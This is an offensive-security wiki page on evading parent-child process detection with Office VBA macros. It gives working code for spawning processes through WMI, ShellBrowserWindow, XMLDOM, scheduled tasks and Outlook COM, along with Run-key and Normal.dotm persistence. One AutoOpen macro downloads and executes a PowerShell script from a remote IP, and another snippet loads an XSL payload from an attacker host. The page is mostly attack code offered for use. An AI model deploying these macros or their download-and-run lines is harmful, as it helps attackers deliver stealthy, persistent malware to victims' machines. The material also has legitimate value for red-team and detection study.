# ⭕ Dechaining Macros

#### Looking at the Parent/Child processes is a good indicator of malicious activity, for example MSWord spawning PowerShell is pretty suspicious. Here, we will show some techniques that can be used to evade these types of analysis.

## <mark style="color:red;">WMI</mark> <a href="#wmi" id="wmi"></a>

```vba
Sub MyMacro()
    Arg = "cmd /k calc.exe"
    GetObject("winmgmts:").Get("Win32_Process").Create Arg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

```vba
// Some codeSet objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("cmd.exe /k calc.exe", Null, objConfig, intProcessID)
```

This will make your process be spawned under "wmiprvse.exe."

#### example macro:

```vba
Sub MyMacro
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
    End Sub
Sub AutoOpen()
    Mymacro
End Sub
```

## <mark style="color:red;">ShellBrowserWindow</mark> <a href="#shellbrowserwindow" id="shellbrowserwindow"></a>

```powershell
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
```

This will make your process spawn from under "explorer.exe"

## <mark style="color:red;">XMLDOM</mark> <a href="#xmldom" id="xmldom"></a>

```vba
Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = False
Set xsl = xml
xsl.load("http://attacker.com/payload.xsl")
xml.transformNode xsl
```

## <mark style="color:red;">Scheduled Tasks</mark> <a href="#3e76" id="3e76"></a>

```vba
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim td: Set td = service.NewTask(0)
td.RegistrationInfo.Author = "Microsoft Corporation"
td.settings.StartWhenAvailable = True
td.settings.Hidden = False
Dim triggers: Set triggers = td.triggers
Dim trigger: Set trigger = triggers.Create(1)
Dim startTime: ts = DateAdd("s", 30, Now)
startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
trigger.StartBoundary = startTime
trigger.ID = "TimeTriggerId"
Dim Action: Set Action = td.Actions.Create(0)
Action.Path = "C:\Windows\System32\notepad.exe"
Call service.GetFolder("\").RegisterTaskDefinition("UpdateTask", td, 6, , , 3)
```

## <mark style="color:red;">Registry Keys</mark> <a href="#registry-keys" id="registry-keys"></a>

We can modify the registry which can serve as persistence and a way of executing your code.&#x20;

#### WMI:

```vba
Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "key1", "value1"
```

#### Wscript:

```vba
Set WshShell = CreateObject("WScript.Shell")
WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\key2", "value2", "REG_SZ
```

## <mark style="color:red;">PPID Spoofing & Command Line Spoofing</mark>&#x20;

Basically we can spoof the parent by passing an arbitrary parent process name you want to use with the CreateProcessA function. We can also spoof the command line arguments by modifying the “CommandLine” in the RTL\_USER\_PROCESS\_PARAMETERS structure in the PEB.

&#x20;The implementation in VBA is here:

{% embed url="https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba" %}

## <mark style="color:red;">Injecting Shellcode</mark> <a href="#injecting-shellcode" id="injecting-shellcode"></a>

Injecting our shellcode to a remote process can make our payload live in another process, although this is not a parent-child evasion technique, we can make our payload live in a remote process.

#### see [injectors/runners](runners-injectors-loaders.md) section.

## <mark style="color:red;">Template persistence</mark>

```vba
Set objShell = CreateObject("Wscript.Shell")
appDataLocation = objShell.ExpandEnvironmentStrings("%APPDATA%")
Path = appDataLocation & "\Microsoft\Templates"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(Path & "\Normal.dotm", True)
objFile.Write payload
objFile.Close
```

## <mark style="color:red;">Outlook</mark> <a href="#outlook" id="outlook"></a>

```vba
Set obj = GetObject("new:0006F03A-0000-0000-C000-000000000046")
obj.CreateObject("WScript.Shell").Run ("calc.exe")
```
